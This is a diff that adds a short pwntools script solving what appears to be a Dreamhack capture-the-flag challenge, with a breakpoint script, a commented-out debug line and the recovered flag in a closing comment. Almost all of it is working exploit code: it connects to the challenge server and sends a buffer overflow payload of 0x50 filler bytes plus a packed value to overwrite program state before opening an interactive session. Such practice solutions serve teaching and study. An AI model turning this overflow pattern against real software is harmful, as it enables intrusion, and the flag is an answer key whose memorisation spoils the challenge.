@@ -1,0 +1,15 @@
+from pwn import *
+
+script = '''
+b *main
+b *main + 193
+'''
+
+p = remote("host1.dreamhack.games", 21467)
+#p = gdb.debug("./chall", gdbscript = script)
+
+payload = b"A" * 0x50 + p32(1)
+p.sendafter("Input: ", payload)
+
+p.interactive()
+#DH{4ae8dab78b961371336e61a58d6ec5bf9af48e06ad3d96b3e5461e264e910eaa}
